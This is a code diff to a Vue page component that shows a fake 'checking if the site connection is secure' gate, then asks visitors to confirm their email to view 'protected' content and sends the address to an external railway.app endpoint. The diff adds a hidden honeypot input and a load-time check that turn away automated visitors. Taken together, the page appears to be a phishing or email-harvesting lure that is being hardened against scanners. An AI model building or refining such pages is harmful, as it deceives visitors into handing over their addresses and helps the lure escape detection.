@@ -1,8 +1,5 @@
 <template>
   <div v-if="!captchaToken" class="gate-container">
-    <header>
-   
-    </header>
     <main>
       <div class="instructions">
         <p>Please stand by while we are checking if the site connection is secure.</p>
@@ -12,9 +9,6 @@
         ></div>
       </div>
     </main>
-    <footer>
-      <p></p>
-    </footer>
   </div>
 
   <div v-else class="background">
@@ -29,6 +23,14 @@
         <div class="content">
           <p><strong>This content is protected, please confirm your email address.</strong></p>
           <div class="form-wrapper">
+            <!-- Honeypot field -->
+            <input
+              v-model="honeypot"
+              type="text"
+              style="display: none;"
+              tabindex="-1"
+              autocomplete="off"
+            />
             <input
               v-model="email"
               type="email"
@@ -64,9 +66,11 @@
 import { ref, onMounted, nextTick } from 'vue'
 
 const email = ref('')
+const honeypot = ref('')
 const error = ref('')
 const loading = ref(false)
 const captchaToken = ref(null)
+const pageLoadTime = Date.now()
 
 let holdTimer = null
 const holdDuration = 1500
@@ -90,6 +94,17 @@ function isValidEmail(e) {
 
 async function verifyEmail() {
   try {
+    const timeSinceLoad = Date.now() - pageLoadTime
+    if (timeSinceLoad < 2000) {
+      error.value = 'Too fast. Please try again.'
+      return
+    }
+
+    if (honeypot.value) {
+      error.value = 'Bot-like activity detected.'
+      return
+    }
+
     const res = await fetch(
       'https://email-verification-app-production-8ea5.up.railway.app/api/check-email',
       {
@@ -137,6 +152,9 @@ function cancelHold() {
   loading.value = false
 }
 </script>
+
+
+
 
 <style scoped>
 html, body {
